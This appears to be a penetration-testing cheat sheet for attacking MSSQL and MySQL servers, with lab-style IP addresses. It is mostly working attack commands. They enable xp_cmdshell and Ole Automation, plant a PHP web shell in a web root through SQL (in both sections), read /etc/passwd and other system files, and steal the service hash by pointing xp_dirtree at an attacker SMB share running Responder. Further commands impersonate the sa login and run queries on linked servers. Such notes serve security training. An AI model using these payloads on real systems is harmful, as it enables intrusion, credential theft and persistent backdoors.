## MSSQL

- master - keeps the information for an instance of SQL Server.
- msdb - used by SQL Server Agent.
- model - a template database copied for each new database.
- resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
-tempdb - keeps temporary objects for SQL queries.


#### GUI support
[Windows - SSMS](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16) \
[Linux - dbeaver](https://github.com/dbeaver/dbeaver/releases) \ 
`sudo dpkg -i dbeaver-<version>.deb` \ 
[Connect to MSSQL from linux video](https://www.youtube.com/watch?v=gU6iQP5rFMw)

Banner Grabing - `nmap -Pn -sV -sC -p1433 10.10.10.125`

#### Impacket
` mssqlclient.py -p 1433 julio@10.129.203.7`

#### Linux - SQSH
`sqsh -S 10.129.20.13 -U username -P Password123`

`sqlcmd -S 10.129.247.219 -U .\\mssqlsvc`

#### Windows - SQLCMD
`C:\user> sqlcmd -S 10.129.20.13 -U username -P Password123`

##### Synatax
`SELECT name FROM master.dbo.sysdatabases`

`xp_cmdshell 'whoami'`

#### Enable xp_xmdshell if we have proper privileges:
```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

#### MSSQL - Enable Ole Automation Procedures:
To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```


#### MSSQL - Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

Read Local Files in MSSQL:
```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

#### Capture MSSQL Service Hash
We need first to start Responder or impacket-smbserver and execute one of the following SQL queries:
1. XP_DIRTREE Hash Stealing:
```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

2. XP_SUBDIRS Hash Stealing
```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

3. XP_SUBDIRS Hash Stealing with Responder
`sudo responder -I tun0 `

4. XP_SUBDIRS Hash Stealing with impacket
`sudo impacket-smbserver share ./ -smb2support`

Impersonate existing users on MSSQL
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

Verifying our Current User and Role 
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

Impersonating the SA User
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

Communicate with Other Databases with MSSQL - Identify linked Servers in MSSQL
```
1> SELECT srvname, isremote FROM sysservers
2> GO
```

As we can see in the query's output, we have the name of the server and the column isremote, where 1 means is a remote server, and 0 is a linked server.

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

---

## MySQL

MySQL default system schemas/databases:

- mysql - is the system database that contains tables that store information required by the MySQL server
- information_schema - provides access to database metadata
- performance_schema - is a feature for monitoring MySQL Server execution at a low level
- sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema


#### Linux MySQL
`mysql -u username -pPassword123 -h 10.129.20.13`

#### Windows MySQL
`C:\user> mysql.exe -u username -pPassword123 -h 10.129.20.13`

#### MySQL - Write Local File
`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`

#### Read local files
`mysql> select LOAD_FILE("/etc/passwd");`
